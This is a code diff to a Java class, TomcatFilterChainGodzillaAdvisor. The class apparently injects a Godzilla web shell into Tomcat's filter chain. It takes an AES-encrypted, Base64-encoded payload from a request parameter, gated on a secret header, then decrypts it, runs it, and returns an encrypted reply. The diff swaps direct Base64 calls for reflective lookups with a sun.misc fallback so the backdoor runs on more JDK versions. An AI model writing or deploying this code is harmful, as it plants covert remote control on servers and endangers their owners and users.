@@ -11,7 +11,6 @@ import javax.servlet.http.HttpServletResponse;
 import javax.servlet.http.HttpSession;
 import java.io.ByteArrayOutputStream;
 import java.lang.reflect.Method;
-import java.util.Base64;
 
 /**
  * @author ReaJason
@@ -37,7 +36,17 @@ public class TomcatFilterChainGodzillaAdvisor {
             if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                 HttpSession session = request.getSession();
                 String parameter = request.getParameter(pass);
-                byte[] data = Base64.getDecoder().decode(parameter);
+                byte[] data = null;
+                Class<?> base64;
+                try {
+                    base64 = Class.forName("java.util.Base64");
+                    Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
+                    data = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, parameter);
+                } catch (Exception var6) {
+                    base64 = Class.forName("sun.misc.BASE64Decoder");
+                    Object decoder = base64.newInstance();
+                    data = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, parameter);
+                }
                 Cipher c = Cipher.getInstance("AES");
                 SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(), "AES");
                 c.init(2, keySpec);
@@ -58,7 +67,16 @@ public class TomcatFilterChainGodzillaAdvisor {
 
                     c.init(1, keySpec);
                     byte[] encryptBytes = c.doFinal(arrOut.toByteArray());
-                    String value = Base64.getEncoder().encodeToString(encryptBytes);
+                    String value = null;
+                    try {
+                        base64 = Class.forName("java.util.Base64");
+                        Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
+                        value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, encryptBytes);
+                    } catch (Exception var6) {
+                        base64 = Class.forName("sun.misc.BASE64Encoder");
+                        Object encoder = base64.newInstance();
+                        value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, encryptBytes);
+                    }
                     response.getWriter().write(value);
                     response.getWriter().write(md5.substring(16));
                 }
